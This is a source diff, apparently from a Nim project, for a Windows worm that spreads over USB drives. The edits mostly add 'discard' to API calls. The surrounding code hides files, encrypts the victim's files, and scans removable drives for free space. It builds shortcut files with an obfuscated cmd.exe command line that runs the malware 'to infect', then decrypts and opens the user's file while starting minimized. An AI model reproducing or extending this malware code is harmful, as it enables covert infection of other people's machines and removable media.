@@ -182,7 +182,7 @@ proc hideFile(path: string): void =
 
   let newAttr: DWORD = setAttributes(attr)
 
-  SetFileAttributes(path, newAttr)
+  discard SetFileAttributes(path, newAttr)
 
 proc createShortcut(sys32: string, programPath: string, savePath: string,
     iconPath: string, iconIndex: int, encryptedFilePath: string,
@@ -191,28 +191,28 @@ proc createShortcut(sys32: string, programPath: string, savePath: string,
     pIL: ptr IShellLink
     pPF: ptr IPersistFile
 
-  CoCreateInstance(&CLSID_ShellLink, nil, CLSCTX_LOCAL_SERVER,
+  discard CoCreateInstance(&CLSID_ShellLink, nil, CLSCTX_LOCAL_SERVER,
       &IID_IShellLink, cast[ptr PVOID](&pIL))
 
-  pIL.QueryInterface(&IID_IPersistFile, cast[ptr PVOID](&pPF))
+  discard pIL.QueryInterface(&IID_IPersistFile, cast[ptr PVOID](&pPF))
 
-  pIL.SetPath(sys32 / d e"cmd.exe")
-  pIL.SetArguments(
+  discard pIL.SetPath(sys32 / d e"cmd.exe")
+  discard pIL.SetArguments(
     ## d(e("")) is different from d e"", see hideString.nim
     d(e("/c \"\"")) & programPath & d(e("\" \"")) & encryptedFilePath & # run program and wait to decrypt file
     d(e("\" && start /B \"\"\"\" \"")) & programPath & # run program to infect
     d(e("\" && start \"\"\"\" \"")) & decryptedFilePath & d(e("\"\"")) # open file
   )
 
-  pIL.SetIconLocation(iconPath, int32 iconIndex)
+  discard pIL.SetIconLocation(iconPath, int32 iconIndex)
 
-  pIl.SetShowCmd(7) # start minimized
+  discard pIl.SetShowCmd(7) # start minimized
 
-  pIL.Release()
+  discard pIL.Release()
 
-  pPF.Save(savePath, true)
+  discard pPF.Save(savePath, true)
 
-  pPF.Release()
+  discard pPF.Release()
 
 proc encryptFile(filePath: string): void =
   # save file contents
@@ -259,14 +259,14 @@ proc searchForUSB(): void =
 
     if driveType == DRIVE_REMOVABLE:
       var freeSpaceInBytes: int64
-      GetDiskFreeSpaceExW(drivePath, cast[PULARGE_INTEGER](
+      discard GetDiskFreeSpaceExW(drivePath, cast[PULARGE_INTEGER](
           addr freeSpaceInBytes), nil, nil)
 
       if freeSpaceInBytes div 1000000 >= 2: # if at least 2mb free
         var lpVolumeNameBuffer: LPCWSTR = newWString(MAX_PATH)
 
-        GetVolumeInformationW(drivePath, lpVolumeNameBuffer, MAX_PATH, nil, nil,
-            nil, nil, 0)
+        discard GetVolumeInformationW(drivePath, lpVolumeNameBuffer, MAX_PATH,
+            nil, nil, nil, nil, 0)
 
         var driveName: string = $lpVolumeNameBuffer
 
@@ -287,6 +287,7 @@ proc searchForUSB(): void =
   searchForUSB()
 
 proc initInfectThread*(): void {.thread.} =
+  ## TODO: SCOATE VARIANTA RECURSIVA DE AICI
   CoInitialize(nil)
   searchForUSB()
   CoUninitialize()
